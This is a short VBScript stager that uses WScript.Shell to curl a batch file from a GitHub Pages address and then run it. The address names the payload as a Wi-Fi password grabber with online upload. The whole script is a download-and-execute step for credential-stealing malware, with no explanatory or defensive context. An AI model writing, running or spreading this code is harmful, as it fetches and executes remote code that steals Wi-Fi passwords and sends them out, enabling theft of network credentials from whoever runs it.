Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run "cmd /c curl https://oceanofanythingofficial.github.io/Wi-Fi-Password-Grabber-With-Online-Upload-Facility-With-Ducky-Script-Batch-Script-vbs-Script/Batch-Script -o Batch-Script.bat"
WScript.Sleep(5000)
WinScriptHost.Run Chr(34) & "Batch-Script.bat" 

